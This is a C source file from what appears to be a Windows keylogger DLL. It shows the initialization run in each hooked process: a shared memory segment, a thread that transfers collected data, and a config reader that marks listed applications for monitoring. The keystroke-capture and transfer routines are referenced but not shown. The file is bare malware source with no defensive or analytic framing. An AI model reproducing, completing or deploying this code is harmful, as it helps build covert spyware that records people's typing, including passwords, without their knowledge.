//* Running in the Main Thread.

#include "..\..\..\Include\Keylog.h"

KLPROCESSDATA			TempProcessData;
DWORD					dataTransferThreadID;
HANDLE					lpDataTransferThread;

HANDLE					hReadNewConfigThread;					// handle of the InitHookProc thread(hInitThread) and ReadKLConfigThread thread(hReadNewConfigThread)

DWORD					dwThreadID;
DWORD					dwRCThreadID;						// Thread IDs of the InitHookProc and ReadKLConfigThread threads

CRITICAL_SECTION		csAppInit;
CRITICAL_SECTION		csLinkList;

BOOL					fInitDone;					// flag to indicate whether initialization is done or not

extern	BOOL			fMonitorApp;					// flag to indicate whether the present application should be monitored or not
extern	WCHAR			wszConfigFilePath[MAX_PATH + 1];	// path of the configuration file

#pragma data_seg( "SharedSegment" )
extern	WCHAR	CurrentDirectory[MAX_PATH + 1];
#pragma data_seg()
#pragma comment ( linker, "/SECTION:SharedSegment,RWS" )

BOOL InitProcess()
{
    __try
    {
        EnterCriticalSection(&csAppInit);
        if (fInitDone == FALSE)
        {
            lpDataTransferThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TransferLinkListData, NULL, 0, &dataTransferThreadID);
            if (lpDataTransferThread == NULL)
                return FALSE;

            BOOL funcRetVal = ReadKLConfig();
            if (funcRetVal == FALSE)
                return FALSE;

            hReadNewConfigThread = CreateThread(NULL, 0, ReadNewKLConfiguration, NULL, 0, &dwRCThreadID);
            if (hReadNewConfigThread == NULL)
                return FALSE;
        }
    }
    __finally
    {
        LeaveCriticalSection(&csAppInit);
    }
    return TRUE;
}

BOOL ReadKLConfig()
{
    WCHAR wszFilePath[MAX_PATH + 1];
    WCHAR *pdest = NULL;

    int Index = 0;
    DWORD dwRetPath;

    KLCONFIG KLConfig;

    FILE *fpConfig = NULL;

    errno_t iError;

    __try
    {
        dwRetPath = GetModuleFileName(NULL, wszFilePath, MAX_PATH);
        if (dwRetPath == 0)
            return FALSE;

        //_wcslwr_s( wszFilePath, MAX_PATH );
        wsprintf(wszConfigFilePath, L"%s\\%s\\KLConfig.conf", CurrentDirectory, FP_KL_DIR);

        iError = _wfopen_s(&fpConfig, wszConfigFilePath, L"rb");
        if (iError != 0)
        {
            OutputDebugString(L"Config file not found");
            return FALSE;
        }

        fread(&KLConfig, sizeof(KLCONFIG), 1, fpConfig);

        for (Index = 0; Index < KLConfig.nApps; Index++)
        {
            //pdest = wcsstr( wszFilePath, KLConfig.AppList[Index] );
            pdest = StrStrI(wszFilePath, KLConfig.AppList[Index]);
            if (pdest == NULL)
                continue;

            wcscpy_s(TempProcessData.wszEXEName, MAX_FILE_NAME, KLConfig.AppList[Index]);
            GetLocalTime(&TempProcessData.stStartTime);

            fMonitorApp = TRUE;
            break;
        }// for

        fInitDone = TRUE;

        return TRUE;
    }
    __finally
    {
        if (fpConfig != NULL)
            fclose(fpConfig);
    }
}
